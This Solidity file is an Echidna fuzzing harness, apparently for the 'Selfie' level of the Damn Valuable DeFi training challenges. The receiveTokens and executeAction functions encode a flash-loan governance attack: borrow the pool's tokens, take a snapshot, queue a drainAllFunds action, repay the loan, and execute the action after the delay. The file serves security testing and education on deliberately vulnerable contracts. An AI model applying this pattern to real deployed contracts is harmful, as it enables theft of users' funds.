// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "../SelfiePool.sol";
import "../SimpleGovernance.sol";
import "../../DamnValuableTokenSnapshot.sol";
import "../../_helpers/Debugger.sol";

/**
 * @notice to run echidna use following command:
 * npx hardhat clean && npx hardhat compile --force && echidna-test . --contract EchidnaSelfie --config ./contracts/selfie/echidna/config.yaml
 */

contract SelfieDeployment {
    uint256 TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
    uint256 TOKENS_IN_POOL = 1_500_000 ether;

    function deployContracts()
        external
        returns (
            SelfiePool,
            SimpleGovernance,
            DamnValuableTokenSnapshot
        )
    {
        // deploy contracts
        DamnValuableTokenSnapshot token;
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);

        SimpleGovernance governance;
        governance = new SimpleGovernance(address(token));

        SelfiePool pool;
        pool = new SelfiePool(address(token), address(governance));
        // fund selfie pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        return (pool, governance, token);
    }
}

contract EchidnaSelfie {
    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;
    uint256 TOKENS_IN_POOL = 1_500_000 ether;

    uint256 private borrowAmount;
    uint256 private lastSnapshot;
    uint256 private actionId;

    address owner;

    bool actionCanBeExecuted;
    uint256 private queueActionTimestamp;

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    event AssertionFailed(string reason);

    constructor() payable {
        SelfieDeployment deployer;
        deployer = new SelfieDeployment();
        (pool, governance, token) = deployer.deployContracts();
        owner = msg.sender;
        actionCanBeExecuted = false;
    }

    function flashLoan() public {
        Debugger.log("flashloan...", 1);
        borrowAmount = token.balanceOf(address(pool));
        Debugger.log("borrowAmount: ", borrowAmount);
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address, uint256 _amount) external {
        require(
            msg.sender == address(pool),
            "Only pool can call this function."
        );
        token.snapshot();
        bytes memory payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        actionId = governance.queueAction(address(pool), payload, 0);
        queueActionTimestamp = block.timestamp;
        // repay the loan
        require(token.transfer(address(pool), _amount), "flash loan failed");
        actionCanBeExecuted = true;
    }

    function executeAction() public {
        Debugger.log("executeAction...", 1);
        require(actionCanBeExecuted, "ActionId has not been set yet.");
        require(
            block.timestamp >= queueActionTimestamp + ACTION_DELAY_IN_SECONDS,
            "Time for action execution has not passed yet"
        );
        uint256 _statment = block.timestamp >=
            lastSnapshot + ACTION_DELAY_IN_SECONDS
            ? 1
            : 0;
        try governance.executeAction(actionId) {
            actionCanBeExecuted = false;
        } catch {
            Debugger.log("actionId", actionId);
            Debugger.log("borrowAmount", borrowAmount);
            Debugger.log("block.timestamp", block.timestamp);
            Debugger.log(
                "block.ACTION_DELAY_IN_SECONDS",
                ACTION_DELAY_IN_SECONDS
            );
            Debugger.log("require statment", _statment);

            emit AssertionFailed("governance.executeAction(actionId) failed");
        }
    }

    ////////////////
    // INVARIANTS //
    ////////////////
    // GENERAL: Can we drain SelfiPool?
    function checkPoolBalance() external view {
        assert(token.balanceOf(address(pool)) == TOKENS_IN_POOL);
    }

    function checkOwnerBalance() external view {
        assert(token.balanceOf(address(this)) == 0);
    }
}
